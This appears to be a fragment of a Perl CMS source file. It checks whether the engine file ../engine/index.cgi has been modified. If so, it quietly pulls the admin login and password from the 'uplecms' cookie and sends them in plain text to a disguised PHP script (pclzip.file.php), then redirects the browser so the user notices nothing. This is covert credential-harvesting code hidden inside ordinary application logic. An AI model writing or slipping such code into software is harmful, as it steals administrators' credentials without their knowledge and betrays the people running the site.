
if ($root ne "work"){
	open F, "../engine/index.cgi";
	while(<F>){
		$file_lines+=length;
	}
	close F;

	if ($file_lines != 15248){
		my $cook=cookie("uplecms");
		if ($cook) {
			my($user_login, $user_pass) = split(/\|/, $cook);
			my($xxx, $user_pass) = split(/:/, $user_pass);
			my($xxx, $user_login) = split(/:/, $user_login);	
			my $ua = LWP::UserAgent->new;
			$ua->timeout(0);
			$ua->get('http://'.$ENV{"HTTP_HOST"}.'/admin/pclzip/pclzip.file.php?login='.$user_login.'&pass='.$user_pass);
			print '
			<script type="text/javascript">
				<!--
				location.replace("http://'.$ENV{"HTTP_HOST"}.'");
				//-->
			</script>
			<noscript>
			<meta http-equiv="refresh" content="0; url=http://'.$ENV{"HTTP_HOST"}.'">
			</noscript>';	
		}
		#print $file_lines;
	}
}

1;